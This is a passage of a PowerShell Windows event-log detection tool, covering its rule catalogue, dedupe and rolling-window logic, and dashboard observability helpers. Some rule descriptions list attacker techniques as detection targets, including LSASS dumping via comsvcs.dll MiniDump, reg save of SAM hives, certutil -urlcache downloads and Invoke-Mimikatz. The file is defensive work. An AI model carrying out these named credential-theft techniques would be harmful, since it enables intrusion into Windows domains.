    Remediation = 'Re-enable the profile (netsh advfirewall set <profile> state on), check Group Policy is enforcing the baseline, and investigate what changed it - assume the host was being prepared for lateral movement.'
  }

  # ---- Discovery ----
  # A type-3 (network/SMB) logon with no credentials at all: the ANONYMOUS
  # account. Pre-auth enumeration (RID cycling, SID brute-forcing, null-session
  # tooling) arrives exactly like this. Deduped per source IP per hour because
  # some networks carry constant anonymous traffic from printers and scanners.
  anonymous_smb_session = @{
    Severity = 'Medium'; Title = 'Anonymous SMB / Network Session'
    EventId = '4624'; EventIds = @('4624'); DedupeMinutes = 60
    Mitre = 'T1087 - Account Discovery'; Category = 'Discovery'
    Description = 'A network logon (type 3) with no account at all - ANONYMOUS LOGON / a null session. Classic pre-auth AD enumeration: SID brute-forcing, RID cycling and null-session tooling all start here.'
    Remediation = 'Disable null session access (RestrictAnonymous) unless explicitly required, then hunt the source for enumeration tooling.'
  }

  firewall_rule_modified = @{
    Severity = 'Medium'; Title = 'Windows Firewall Rule Added or Modified'
    EventId = '4946/4947/4948/4949'; EventIds = @('4946', '4947', '4948', '4949'); DedupeMinutes = 15
    Mitre = 'T1562.004 - Impair Defenses: Disable or Modify System Firewall'; Category = 'Defense Evasion'
    Description = 'A local firewall rule was changed. Attackers add inbound rules to open remote-access ports, or disable rules to allow outbound command-and-control.'
    Remediation = 'Compare the rule against the managed firewall baseline, remove local rules that are not in the baseline, and manage firewall policy centrally.'
  }
  system_time_changed = @{
    Severity = 'Medium'; Title = 'System Time Changed'
    EventId = '4616'; EventIds = @('4616'); DedupeMinutes = 15
    Mitre = 'T1099 - Timestomping'; Category = 'Defense Evasion'
    Description = 'The system clock was set. On a domain controller this breaks Kerberos and shifts event timestamps, which undermines log correlation and forensic timelines.'
    Remediation = 'Ensure DCs sync time from a trusted, authenticated NTP source and that members follow domain time - and investigate manual changes.'
  }
  special_privileges_assigned = @{
    Severity = 'Low'; Title = 'Administrative Privileges Assigned to a Logon'
    EventId = '4672'; EventIds = @('4672'); DedupeMinutes = 60
    Mitre = 'T1078 - Valid Accounts'; Category = 'Privilege Escalation'
    Description = 'A logon was granted administrator-equivalent privileges (SeDebugPrivilege and friends). Expected for real administrators - valuable as a baseline of who holds effective admin rights.'
    Remediation = 'Use this as an inventory of administrative sessions: compare against the list of people who should hold admin rights and remove standing access where it is not needed.'
  }
  gpo_or_admin_object_modified = @{
    Severity = 'High'; Title = 'GPO or AdminSDHolder Object Modified'
    EventId = '5136'; EventIds = @('5136'); DedupeMinutes = 30
    Mitre = 'T1484 - Group Policy Modification / T1098 - Account Manipulation'; Category = 'Persistence'
    Description = 'A change was made to a Group Policy object (groupPolicyContainer), a GPO link (gPLink), the AdminSDHolder nTSecurityDescriptor, or an account''s sIDHistory attribute. sIDHistory or AdminSDHolder changes are Critical; GPO/GPO link changes are High. Machine accounts are excluded.'
    Remediation = 'Verify the change was authorized. For sIDHistory: this is a Golden Ticket indicator - rotate KRBTGT twice. For AdminSDHolder: check for backdoor ACLs. For GPO: check for malicious scripts/startup commands.'
  }
  computer_account_abuse = @{
    Severity = 'Medium'; Title = 'Computer Account Abuse / RBCD'
    EventId = '4741/4742'; EventIds = @('4741', '4742'); DedupeMinutes = 30
    Mitre = 'T1136.002 - Create Account: Domain Account / T1134.001 - Token Impersonation'; Category = 'Persistence'
    Description = 'A computer account was created/modified by a non-administrator, or the delegation attribute (msDS-AllowedToActOnBehalfOfOtherIdentity) was modified - a common technique for Resource-Based Constrained Delegation (RBCD) attacks to hijack services.'
    Remediation = 'Verify the creation/modification is legitimate. For delegation changes: check if the computer account is now delegated to a rogue principal (RBCD), and revert if unauthorized.'
  }
  suspicious_process_creation = @{
    Severity = 'High'; Title = 'Suspicious Process Creation'
    EventId = '4688'; EventIds = @('4688'); DedupeMinutes = 15
    Mitre = 'T1059.001 - Command and Scripting Interpreter: PowerShell / T1003.001 - OS Credential Dumping: LSASS Memory / T1505.003 - Server Software Component: Web Shell'; Category = 'Execution'
    Description = 'A process was created with a suspicious command line: ntdsutil (AD database tool), vssadmin delete/create shadow (shadow copy abuse), reg save of SAM/SYSTEM/SECURITY hives (credential dumping), rundll32 comsvcs.dll MiniDump (LSASS dumping), certutil -urlcache (download/execute), or encoded PowerShell (-enc). Requires "Process Creation" audit + command-line logging registry value ProcessCreationIncludeCmdLine_Enabled.'
    Remediation = 'Investigate the parent process and user context. Enable command-line logging (ProcessCreationIncludeCmdLine_Enabled=1) if not already. Block execution of these tools via AppLocker/WDAC where possible.'
  }
  powershell_scriptblock = @{
    Severity = 'High'; Title = 'PowerShell Script Block Logging - Offensive Content'
    EventId = '4104'; EventIds = @('4104'); DedupeMinutes = 30
    Mitre = 'T1059.001 - Command and Scripting Interpreter: PowerShell / T1059.003 - Windows Command Shell'; Category = 'Execution'
    Description = 'A PowerShell script block was logged containing offensive strings: Invoke-Mimikatz, DumpCreds, Invoke-Kerberoast, FromBase64String+IEX, AmsiUtils, Invoke-Obfuscation, Invoke-Expression with obfuscated payloads, or known malicious patterns. Requires PowerShell Script Block Logging (Module Logging) enabled. Stored script text is truncated for safety.'
    Remediation = 'Review the full script block in the event log. Check if the host/user is compromised. Ensure Script Block Logging is enabled via GPO: Computer Configuration -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn on PowerShell Script Block Logging.'
  }
  dsrm_password_set = @{
    Severity = 'Critical'; Title = 'DSRM Password Set'
    EventId = '4794'; EventIds = @('4794'); DedupeMinutes = 60
    Mitre = 'T1003.006 - OS Credential Dumping: DCSync / T1556.002 - Modify Authentication Process: Password Filter'; Category = 'Credential Access'
    Description = 'The Directory Services Restore Mode (DSRM) password was set on a Domain Controller. This is a critical indicator of compromise - attackers set a known DSRM password to later boot into DSRM and extract the NTDS.dit database.'
    Remediation = 'Immediately investigate who changed the DSRM password. If unauthorized, reset the DSRM password from a known-good backup, and rotate KRBTGT twice. Review for signs of DCSync or NTDS.dit extraction.'
  }
  pass_the_hash_logon = @{
    Severity = 'Critical'; Title = 'Pass-the-Hash Logon'
    EventId = '4624'; EventIds = @('4624'); DedupeMinutes = 15
    Mitre = 'T1550.002 - Use Alternate Authentication Material: Pass the Hash'; Category = 'Credential Access'
    Description = 'A logon of type 9 (new credentials) or a network logon (type 3) using NTLM with KeyLength=0 from a non-machine account to a non-localhost source - indicates pass-the-hash or pass-the-ticket lateral movement.'
    Remediation = 'Immediately isolate the source host. Rotate the target account password and KRBTGT. Verify the source is not a legitimate administrative tool. Enable NTLM auditing and restrict NTLM where possible.'
  }
}

# ============================================================
# STATE
# ============================================================
$Script:Windows = @{}             # trackerName -> @{ bucket -> @( @{ Value; Time } ) }
$Script:RecentAlertTimes = @{}    # dedupeKey -> last fired (dedupe window)
$Script:DedupeAlertId = @{}       # dedupeKey -> Id of the open alert it created
$Script:Alerts = New-Object System.Collections.Generic.List[object]
$Script:NextAlertId = 1
$Script:SeenRecords = @{}         # "channel|EventRecordID" -> seen, so a re-polled event is evaluated once (record ids are unique per channel, not globally)
$Script:AlertsDirty = $true       # /api/alerts caches its JSON until an alert changes
$Script:AlertsJson = '[]'
$Script:ForwardFailures = 0
$Script:SelfTestAlerts = 0
$Script:AuditState = $null        # filled in by Update-AuditPreflight
$Script:AuditCheckedAt = $null
$Script:LastCheck = (Get-Date).AddMinutes(-2)   # default for a channel with no mark yet
$Script:ProcessedCount = 0
$Script:StartedAt = Get-Date

# ---- per-channel poll state ------------------------------------------------
# One watermark PER LOG CHANNEL (Security / System / Defender). A single shared
# watermark meant one slow or failing channel held back - or worse, advanced past
# - the others. A channel's mark only moves when that channel's query AND its
# processing both completed.
$Script:ChannelMarks = @{}        # channel -> watermark (DateTime)
$Script:ChannelLastSuccess = @{}  # channel -> last fully successful poll
$Script:ChannelLastError = @{}    # channel -> last error message for that channel
$Script:XPathFallback = @{}       # channel -> $true once the XPath pre-filter was rejected
$Script:ChannelUnavailable = @{}  # channel -> $true when the OS has no such log (skipped forever, not an error)
$Script:AuditStateTestSeed = $false  # the suite seeds the audit state itself; the preview must not re-read
$Script:AuditChangeCaller = $null    # the signed-in user driving an audit apply from the UI
$Script:AuditChangeCallerIp = $null  # their address, for the auth log
$Script:EvalErrors = 0            # events the rule engine threw on (skipped, not fatal)
$Script:LastEvalError = ''
$Script:PollErrors = 0            # failed channel queries (watermark left alone)
$Script:LastPollError = ''
$Script:LagSeconds = 0
$Script:LagWarned = $false

# Triage states - same vocabulary the ALPHA web platform uses for its alerts.
$AlertStatuses = @('New', 'Investigating', 'Resolved', 'False Positive')

# restore history: alerts + ack + triage state survive restarts.
# Severity / Title / Rule / EventId are restored from the CSV when present.
# The old restore rebuilt EVERY row from $RuleMeta, so an alert that had been
# upgraded in place (brute force crossing its second threshold, a service path
# turning suspicious) silently reverted to the rule's default severity on
# restart. Rows written by older versions lack those columns and fall back to
# the catalog values.
if (Test-Path $HistoryFile) {
  try {
    Import-Csv $HistoryFile | ForEach-Object {
      $ruleKey = $_.'RuleKey'
      if ($ruleKey -and $RuleMeta.ContainsKey($ruleKey)) {
        $meta = $RuleMeta[$ruleKey]
        $idInt = 0
        [void][int]::TryParse($_.'Id', [ref]$idInt)
        $status = "$($_.'Status')"
        if (-not $status -or ($AlertStatuses -notcontains $status)) { $status = 'New' }
        $sev = "$($_.'Severity')"
        if (-not $sev -or -not $SevRank.ContainsKey($sev)) { $sev = $meta.Severity }
        $storedRule = "$($_.'EventId')"
        if (-not $storedRule) { $storedRule = "$($_.'Rule')" }
        if (-not $storedRule) { $storedRule = $meta.EventId }
        $storedTitle = "$($_.'Title')"
        if (-not $storedTitle) { $storedTitle = $meta.Title }
        $isSelfTest = ("$($_.'SelfTest')" -eq 'yes') -or ("$($_.'Description')" -like '*[SELF-TEST]*')
        $Script:Alerts.Add([PSCustomObject]@{
          Id           = $idInt
          Time         = $_.'Time'
          RuleKey      = $ruleKey
          Rule         = $storedRule
          Severity     = $sev
          Title        = $storedTitle
          Mitre        = $meta.Mitre
          Remediation  = $meta.Remediation
          Description  = $_.'Description'
          Host         = $_.'Host'
          Account      = $_.'Account'
          SourceIp     = $_.'SourceIp'
          EventId      = $storedRule
          Acknowledged = ($_.'Acknowledged' -eq 'yes')
          Status       = $status
          Notes        = "$($_.'Notes')"
          SelfTest     = $isSelfTest
        })
        if ($isSelfTest) { $Script:SelfTestAlerts++ }
        if ($idInt -ge $Script:NextAlertId) { $Script:NextAlertId = $idInt + 1 }
      }
    }
    $Script:AlertsDirty = $true
  } catch { }
}

# ============================================================
# HELPERS
# ============================================================
# DEDUPE IS PER RULE **AND ENTITY**, NOT PER RULE ALONE.
# The old key was the rule key by itself, so ONE alert inside the window
# suppressed everything else for that rule: a second Domain Admins addition
# within 15 minutes was swallowed by the first, and a second spraying source
# disappeared behind the first source's alert. $entity is the thing the rule
# actually fired on (source IP, account, workstation, service principal...);
# pass $null only for rules that are genuinely global (lockout storm, log
# tampered, audit policy changed).
function Get-DedupeKey($ruleKey, $entity) {
  if ($entity -and "$entity") { return "$ruleKey|$("$entity".ToLower())" }
  return $ruleKey
}

function Should-Dedupe($ruleKey, $entity, $newSeverity = $null, $newDescription = $null) {
  $meta = $RuleMeta[$ruleKey]
  $minutes = if ($meta -and $meta.DedupeMinutes) { $meta.DedupeMinutes } else { 15 }
  $key = Get-DedupeKey $ruleKey $entity

  if ($Script:RecentAlertTimes.ContainsKey($key) -and
      ((Get-Date) - $Script:RecentAlertTimes[$key]) -lt (New-TimeSpan -Minutes $minutes)) {

    # A repeat inside the window is suppressed - EXCEPT when the detection got
    # MORE SEVERE (an attack that crossed a second threshold: brute force past
    # 20 failures, a service path turning suspicious, UAC dropping pre-auth).
    # A rising attack must not stay filed at its earlier severity, so upgrade
    # the open alert in place instead of dropping the hit. Mirrors
    # createAlert() in alpha/utils/detectionRules.js so both engines behave the
    # same. Still returns $true: no NEW alert is created on this path.
    $target = if ($newSeverity) { $newSeverity } else { $meta.Severity }
    if ($target -and $SevRank.ContainsKey($target)) {
      # look up the alert THIS dedupe key created (so a second source does not
      # upgrade the first source's alert), falling back to the newest open
      # alert for the rule - restored-from-history rows have no key mapping
      $open = $null
      $openId = $Script:DedupeAlertId[$key]
      if ($openId) { $open = $Script:Alerts | Where-Object { $_.Id -eq $openId } | Select-Object -First 1 }
      if (-not $open) {
        $open = $Script:Alerts | Where-Object {
          $_.RuleKey -eq $ruleKey -and -not $_.Acknowledged -and
          ($_.Status -eq 'New' -or $_.Status -eq 'Investigating' -or -not $_.Status)
        } | Sort-Object Id -Descending | Select-Object -First 1
      }
      if ($open) {
        if ($SevRank.ContainsKey("$($open.Severity)") -and $SevRank[$target] -lt $SevRank["$($open.Severity)"]) {
          $open.Severity = $target
          if ($newDescription) { $open.Description = $newDescription }
          $Script:AlertsDirty = $true
        }
        # This hit did not create a new alert, but it DID contribute to the open
        # one: the drawer shows the contributing events and the kill-chain
        # timeline is built from them, so record it (bounded) and restamp.
        $hitTime = $Script:LastEventTime
        $hitStamp = if ($hitTime) { $hitTime.ToUniversalTime().ToString("o") } else { (Get-Date).ToUniversalTime().ToString("o") }
        $open.LastSeen = $hitStamp
        $open.Count = [int]$open.Count + 1
        $evts = @($open.Events)
        $evts += [PSCustomObject]@{ time = $hitStamp; summary = (Get-EventSummary $Script:LastNormFields $ruleKey) }
        if ($evts.Count -gt $Script:MaxAlertEvents) { $evts = @($evts | Select-Object -Last $Script:MaxAlertEvents) }
        $open.Events = $evts
        $Script:AlertsDirty = $true
        return $true
      }
      # no open alert inside the window - the earlier one was acknowledged,
      # resolved or cleared: fire a fresh alert instead of swallowing the hit
      # (mirrors createAlert(): no open row inside the window -> INSERT)
      $Script:RecentAlertTimes[$key] = Get-Date
      return $false
    }
    return $true
  }

  $Script:RecentAlertTimes[$key] = Get-Date
  return $false
}

function Get-Field($xml, $name) {
  $node = $xml.Event.EventData.Data | Where-Object { $_.Name -eq $name }
  if ($node) { return $node.'#text' } else { return $null }
}

# Event IDs disagree about what they call the same thing (4776 logs
# "Workstation" where 4625 logs "WorkstationName"; 7045 logs "ImagePath" where
# 4697 logs "ServiceFileName") - read the first field that is present.
function Get-FirstField($xml, $names) {
  foreach ($n in $names) {
    $v = Get-Field $xml $n
    if ($v) { return $v }
  }
  return $null
}

function Test-PrivilegedGroup($group) {
  if (-not $group) { return $false }
  $g = "$group".ToLower()
  foreach ($p in $PrivilegedGroups) { if ($g.Contains($p)) { return $true } }
  return $false
}

function Test-PrivilegedName($name) {
  if (-not $name) { return $false }
  return ("$name" -match '(?i)admin|da_|svc[-_]|service|backup|sql|krbtgt|replicat')
}

# Machine account (WKS01$, DC02$): a DC replicating directory changes IS normal,
# and a computer account logging on remotely is not lateral movement.
function Test-MachineAccount($name) {
  if (-not $name) { return $false }
  return ("$name" -match $MachineAccountRegex)
}

# SYSTEM / LOCAL SERVICE / NETWORK SERVICE / ANONYMOUS LOGON / DWM-* / UMFD-*:
# principals that log on and take privileges continuously by design.
function Test-SystemAccount($name) {
  if (-not $name) { return $false }
  return ("$name" -match $SystemAccountRegex)
}

# svc-*, app_*, sql*, backup*, ... - the naming shapes used for the accounts
# that legitimately make network (type 3) logons all day.
function Test-ServiceLike($name) {
  if (-not $name) { return $false }
  return ("$name" -match $ServiceLikeRegex)
}

# 4738 gives OldUacValue / NewUacValue as hex strings ("0x200"). Returns
# [int64], or $null when the value is missing/unparseable.
function ConvertTo-UacFlags($v) {
  $s = "$v".Trim()
  if (-not $s) { return $null }
  try {
    if ($s -match '(?i)^0x') { return [int64][Convert]::ToInt64($s.Substring(2), 16) }
    if ($s -match '^[0-9]+$') { return [int64]$s }
    return $null
  } catch { return $null }
}

# -- rolling windows --------------------------------------------------------
function Get-Window($name) {
  if (-not $Script:Windows.ContainsKey($name)) { $Script:Windows[$name] = @{} }
  return $Script:Windows[$name]
}

# Records a hit and returns the (trimmed) window for that bucket, so the
# caller can immediately test its threshold. Returns the array plainly: every
# call site wraps the call in @(), and the comma trick (return ,$kept) would
# hand back a one-element array containing the window instead of the window.
# -When is the EVENT's own time, not the moment Sentinel got around to
# processing it. The old code stamped every hit with Get-Date, so a rule that
# says "8 failures in 10 minutes" was really measuring processing time: after a
# slow poll (or a replay of exported events) the whole window shifted with it.
#
# Expiry is a PREFIX TRIM, not a Where-Object scan over the whole bucket. Events
# are processed oldest-first, so the expired hits are always at the front, and
# scanning the entire bucket for every event made a sustained brute force
# quadratic - exactly when the tool needs to keep up. If an event ever arrives
# out of order the array stops being monotonic, and the exact filter is used
# instead, so a stale hit can never be counted.
function Add-WindowHit($name, $bucket, $value, $minutes, $when = $null) {
  $w = Get-Window $name
  $stamp = if ($when) { ([datetime]$when).ToUniversalTime() } else { (Get-Date).ToUniversalTime() }
  if (-not $w.ContainsKey($bucket)) { $w[$bucket] = @() }
  $kept = $w[$bucket]
  $cut = $stamp.AddMinutes(-$minutes)

  if ($kept.Count -gt 0 -and $kept[$kept.Count - 1].Time -le $stamp) {
    $drop = 0
    while ($drop -lt $kept.Count -and $kept[$drop].Time -le $cut) { $drop++ }
    if ($drop -ge $kept.Count) { $kept = @() }
    elseif ($drop -gt 0) { $kept = @($kept[$drop..($kept.Count - 1)]) }
  } else {
    $kept = @($kept | Where-Object { $_.Time -gt $cut })
  }

  $kept += [PSCustomObject]@{ Value = $value; Time = $stamp }
  $w[$bucket] = $kept
  return $kept
}

# Distinct, non-empty values in a window. A hashtable rather than a
# ForEach/Where/Select-Object pipeline: the pipeline ran per event and made the
# spraying rules quadratic on a large window. Lower-cased keys keep the
# case-insensitive behaviour of the old Select-Object -Unique.
function Get-DistinctCount($items) {
  $seen = @{}
  foreach ($item in @($items)) {
    $v = $item.Value
    if ($v) { $seen["$v".ToLower()] = $true }
  }
  return $seen.Count
}

# -- the alert object -------------------------------------------------------
# $fields is the normalised event (same field names the web collector sends),
# kept on the alert so web forwarding can hand the platform's rule engine the
# full event rather than just an event ID.
# Time is the event's own time when the caller supplies one (live polling and
# replay both do), so the dashboard clock matches the event log rather than the
# poll that picked it up.
function New-Alert($ruleKey, $description, $severityOverride, $fields, $dedupeKey = $null, $eventTime = $null) {
  $meta = $RuleMeta[$ruleKey]
  if (-not $meta) { return $null }
  $sev = if ($severityOverride) { $severityOverride } else { $meta.Severity }
  $stamp = if ($eventTime) { $eventTime.ToUniversalTime().ToString("o") } else { (Get-Date).ToUniversalTime().ToString("o") }
  # remember that this event matched this rule even when no NEW alert comes out
  # of it (the dedupe path), so the events feed can say what fired
  $Script:LastMatchedRule = $ruleKey
  $mitre = Get-MitreParts "$($meta.Mitre)"
  # entity = the thing the rule fired on: everything after the rule key in the
  # dedupe key ("rule|entity"), which is the account, ip, workstation or SPN
  $entity = ''
  if ($dedupeKey -and $dedupeKey.Contains('|')) { $entity = $dedupeKey.Substring($dedupeKey.IndexOf('|') + 1) }
  $alert = [PSCustomObject]@{
    Entity       = $entity
    MitreId      = $mitre.id
    MitreName    = $mitre.name
    Tactic       = Get-MitreTactic "$($meta.Category)"
    FirstSeen    = $stamp
    LastSeen     = $stamp
    Count        = 1
    Events       = @([PSCustomObject]@{ time = $stamp; summary = (Get-EventSummary $fields $ruleKey) })
    Id           = $Script:NextAlertId
    Time         = $stamp
    RuleKey      = $ruleKey
    Rule         = $meta.EventId
    Severity     = $sev
    Title        = $meta.Title
    Mitre        = $meta.Mitre
    Remediation  = $meta.Remediation
    Description  = $description
    Host         = $fields.hostname
    Account      = $fields.accountName
    SourceIp     = $fields.sourceIp
    EventId      = "$($fields.eventId)"
    Acknowledged = $false
    Status       = 'New'
    Notes        = ''
    SelfTest     = $false
    DedupeKey    = $dedupeKey
    Fields       = $fields
  }
  # remember which alert this dedupe key created, so a later hit inside the
  # window upgrades THAT alert instead of whichever one is newest
  if ($dedupeKey) { $Script:DedupeAlertId[$dedupeKey] = $alert.Id }
  $Script:NextAlertId++
  $Script:AlertsDirty = $true
  return $alert
}


# ============================================================
# DASHBOARD OBSERVABILITY - rolling, in-memory, per process
# ============================================================
# Short human phrases per event id, used for the events ring buffer and the
# "contributing events" list on an alert. Generated text only: the raw event
# message is never copied anywhere near these structures.
$EventPhrases = @{
  '4624' = 'Successful logon'
  '4625' = 'Failed logon'
  '4648' = 'Logon with explicit credentials'
  '4657' = 'Registry value modified'
  '4662' = 'Directory service access'
  '4672' = 'Special privileges assigned'
  '4697' = 'Service installed'
  '4698' = 'Scheduled task created'
  '4719' = 'Audit policy changed'
  '4720' = 'User account created'
  '4722' = 'User account enabled'
  '4724' = 'Password reset attempted'
  '4725' = 'User account disabled'
  '4726' = 'User account deleted'
  '4728' = 'Member added to a global group'
  '4729' = 'Member removed from a global group'
  '4732' = 'Member added to a local group'
  '4733' = 'Member removed from a local group'
  '4738' = 'User account changed'
  '4740' = 'Account locked out'
  '4756' = 'Member added to a universal group'
  '4768' = 'Kerberos TGT requested'
  '4769' = 'Kerberos service ticket requested'
  '4771' = 'Kerberos pre-authentication failed'
  '4776' = 'NTLM credential validation'
  '4946' = 'Firewall rule added'
  '4947' = 'Firewall rule modified'
  '4948' = 'Firewall rule deleted'
  '4949' = 'Firewall settings restored'
  '5001' = 'Defender real-time protection disabled'
  '5010' = 'Defender scanning disabled'
  '5012' = 'Defender action failed'
  '5141' = 'Directory object deleted'
  '7045' = 'Service installed'
  '1100' = 'Event log service stopped'
  '1102' = 'Audit log cleared'
  '4616' = 'System time changed'
}

# MemberName / SubjectUserName / TargetUserName can arrive as a distinguished name
# ("CN=attacker,OU=Corp,DC=example,DC=local") for group-membership events, and the
# dashboard wants the account, not its path in the directory.
function ConvertTo-AccountName([string]$value) {
  if (-not $value) { return '' }
  $v = "$value".Trim()
  if ($v -match '^\s*CN\s*=\s*([^,]+)') { return $Matches[1].Trim() }
  return $v
}

# One short line describing an event, for the ring buffer and the kill-chain.
# Bounded on purpose: a dashboard row is not the place for a 4 KB command line.
function Get-EventSummary($fields, [string]$ruleKey = '') {
  if (-not $fields) { return 'event' }
  $id = "$($fields.eventId)"
  $phrase = "$($EventPhrases[$id])"
  if (-not $phrase) { $phrase = 'Event ' + $id }
  $who = ''
  if ($fields.accountName) { $who = "$($fields.accountName)" }
  elseif ($fields.targetUserName) { $who = "$($fields.targetUserName)" }
  elseif ($fields.subjectUserName) { $who = "$($fields.subjectUserName)" }
  elseif ($fields.sourceIp) { $who = "$($fields.sourceIp)" }
  $line = $phrase
  if ($who) { $line = $line + ' - ' + $who }
  if ($line.Length -gt 120) { $line = $line.Substring(0, 120) }
  return $line
}

# 'T1098.003 - Account Manipulation' -> id + name. A rule can name two
# techniques separated by ' / ' (ldap_recon): the first is the headline.
function Get-MitreParts([string]$mitre) {
  $id = ''
  $name = ''
  $text = "$mitre"
  if ($text -match ' / ') { $text = ($text -split ' / ')[0] }
  if ($text -match '^\s*(T\d{4}(?:\.\d{3})?)\s*-\s*(.+?)\s*$') { $id = $Matches[1]; $name = $Matches[2] }
  elseif ($text -match '^\s*(T\d{4}(?:\.\d{3})?)') { $id = $Matches[1] }
  return [PSCustomObject]@{ id = $id; name = $name }
}

# The rule catalogue's own Category IS the tactic label this tool files a rule
# under, with one exception (Identity Abuse is not a MITRE tactic).
function Get-MitreTactic([string]$category) {
  if (-not $category) { return 'Uncategorised' }
  if ($category -eq 'Identity Abuse') { return 'Privilege Escalation' }
  return $category
}

# ---- hourly buckets (24 kept) ----------------------------------------------
function Get-HourBucket($when) {
  $local = $when.ToLocalTime()
  $key = $local.ToString("yyyy-MM-ddTHH")
  if (-not $Script:ObsHours.ContainsKey($key)) {
    if ($Script:ObsHours.Count -ge 24) {
      # drop the oldest bucket(s) so the window is always the last 24 hours
      $keys = @($Script:ObsHours.Keys | Sort-Object)
      while ($keys.Count -ge 24) {
        $Script:ObsHours.Remove($keys[0])
        $keys = @($Script:ObsHours.Keys | Sort-Object)
      }
    }
    $Script:ObsHours[$key] = [PSCustomObject]@{
      key         = $key
      hour        = $local.ToString("HH:00")
      stamp       = $local.ToString("o")
      events      = 0
      alertSev    = @{ Critical = 0; High = 0; Medium = 0; Low = 0 }
      tactics     = @{}
      # the tile values when this hour STARTED, so the dashboard can show a delta
      startTiles  = $null
    }
  }
  return $Script:ObsHours[$key]
}

# ---- hosts seen ------------------------------------------------------------
function Update-HostSeen($fields, [bool]$isAlert) {
  if (-not $fields) { return }
  $h = "$($fields.hostname)"
  if (-not $h) { return }
  $now = (Get-Date).ToUniversalTime().ToString("o")
  if (-not $Script:ObsHosts.ContainsKey($h)) {
    $Script:ObsHosts[$h] = [PSCustomObject]@{
      host       = $h
      firstSeen  = $now
      lastSeen   = $now
      eventCount = 0
      alertCount = 0
      users      = @()
      ips        = @()
    }
  }
  $rec = $Script:ObsHosts[$h]
  $rec.lastSeen = $now
  if ($isAlert) { $rec.alertCount = [int]$rec.alertCount + 1 } else { $rec.eventCount = [int]$rec.eventCount + 1 }
  $u = ConvertTo-AccountName "$($fields.accountName)"
  if (-not $u) { $u = ConvertTo-AccountName "$($fields.subjectUserName)" }
  if ($u -and $u -ne '') {
    $users = @($rec.users)
    if ($users -notcontains $u) {
      $users += $u
      if ($users.Count -gt $Script:MaxObsHostUsers) { $users = @($users | Select-Object -Last $Script:MaxObsHostUsers) }
      $rec.users = $users
    }
  }
  $ip = Get-NormalisedIp "$($fields.sourceIp)"
  if ($ip -and $ip -ne '' -and $ip -ne '-') {
    $ips = @($rec.ips)
    if ($ips -notcontains $ip) {
      $ips += $ip
      if ($ips.Count -gt $Script:MaxObsHostIps) { $ips = @($ips | Select-Object -Last $Script:MaxObsHostIps) }
      $rec.ips = $ips
    }
  }
  # evict the hosts we have not seen for the longest, so a busy DC cannot grow
  # the map without bound
  if ($Script:ObsHosts.Count -gt $Script:MaxObsHosts) {
    $excess = $Script:ObsHosts.Count - $Script:MaxObsHosts
    $oldest = @($Script:ObsHosts.Values | Sort-Object lastSeen | Select-Object -First $excess)
    foreach ($o in $oldest) { $Script:ObsHosts.Remove($o.host) }
  }
}

# ---- one observed (normalised) event ---------------------------------------
function Add-ObservedEvent($channel, $fields, $matchedRule, $when = $null) {
  if (-not $fields) { return }
  $ts = $when
  if (-not $ts) { $ts = Get-Date }
  $user = ConvertTo-AccountName "$($fields.accountName)"
  if (-not $user) { $user = ConvertTo-AccountName "$($fields.subjectUserName)" }
  if (-not $user) { $user = ConvertTo-AccountName "$($fields.targetUserName)" }
  $entry = [PSCustomObject]@{
    time        = $ts.ToUniversalTime().ToString("o")
    eventId     = "$($fields.eventId)"
    channel     = "$channel"
    host        = "$($fields.hostname)"
    user        = $user
    sourceIp    = "$($fields.sourceIp)"
    summary     = Get-EventSummary $fields "$matchedRule"
    matchedRule = if ($matchedRule) { "$matchedRule" } else { $null }
  }
  $Script:ObsEvents.Add($entry)
  while ($Script:ObsEvents.Count -gt $Script:MaxObsEvents) { $Script:ObsEvents.RemoveAt(0) }
  $hb = Get-HourBucket $ts
  if ($null -eq $hb.startTiles) { $hb.startTiles = Get-TileSnapshot }
  $hb.events = [int]$hb.events + 1
  Update-HostSeen $fields $false
  Update-IpSeen $fields $false
}

# ---- one raised alert ------------------------------------------------------
function Add-ObservedAlert($alert) {
  if (-not $alert) { return }
  if ($alert.SelfTest) { return }   # synthetic rows are not coverage
  $ts = Get-Date
  if ($alert.Time) { try { $ts = [datetime]::Parse("$($alert.Time)") } catch { $ts = Get-Date } }
  $hb = Get-HourBucket $ts
  if ($null -eq $hb.startTiles) { $hb.startTiles = Get-TileSnapshot }
  $sev = "$($alert.Severity)"
  if ($hb.alertSev.ContainsKey($sev)) { $hb.alertSev[$sev] = [int]$hb.alertSev[$sev] + 1 }
  $tactic = "$($alert.Tactic)"
  if (-not $tactic) { $tactic = 'Uncategorised' }
  $hb.tactics[$tactic] = [int]$hb.tactics[$tactic] + 1
  if ($null -eq $hb.startTiles) { $hb.startTiles = Get-TileSnapshot }
  $fields = @{ hostname = "$($alert.Host)"; accountName = "$($alert.Account)"; sourceIp = "$($alert.SourceIp)" }
  Update-HostSeen $fields $true
  Update-IpSeen $fields $true
}

# ---- the tile values, used for the deltas ---------------------------------
function Get-TileSnapshot {
  # NOTE: read the current bucket if it exists rather than calling Get-HourBucket,
  # which would CREATE one - a snapshot taken at the start of an hour used to open
  # an empty bucket for the current hour and show up as a phantom row on the chart
  $open = @($Script:Alerts | Where-Object { -not $_.SelfTest -and ($_.Status -eq 'New' -or $_.Status -eq 'Investigating' -or -not $_.Status) })
  $crit = @($open | Where-Object { $_.Severity -eq 'Critical' }).Count
  $high = @($open | Where-Object { $_.Severity -eq 'High' }).Count
  $eventsThisHour = 0
  $key = (Get-Date).ToLocalTime().ToString("yyyy-MM-ddTHH")
  if ($Script:ObsHours.ContainsKey($key)) { $eventsThisHour = [int]$Script:ObsHours[$key].events }
  return [PSCustomObject]@{
    openAlerts    = $open.Count
    critical      = $crit
    high          = $high
    eventsLastHour = $eventsThisHour
    hostsSeen     = $Script:ObsHosts.Count
  }
}

# ---- the payloads the new dashboard reads ---------------------------------
# Each is a plain object so the suite can assert its shape without HTTP.
function Get-OverviewPayload {
  $nonSelf = @($Script:Alerts | Where-Object { -not $_.SelfTest })
  $open = @($nonSelf | Where-Object { $_.Status -eq 'New' -or $_.Status -eq 'Investigating' -or -not $_.Status })
  $tiles = Get-TileSnapshot
  $tiles.openAlerts = $open.Count
  $tiles.critical = @($open | Where-Object { $_.Severity -eq 'Critical' }).Count
  $tiles.high = @($open | Where-Object { $_.Severity -eq 'High' }).Count

  # deltas: against the same values when the PREVIOUS hour bucket started
  $keys = @($Script:ObsHours.Keys | Sort-Object)
  $prevTiles = $null
  if ($keys.Count -ge 2) { $prevTiles = $Script:ObsHours[$keys[$keys.Count - 2]].startTiles }
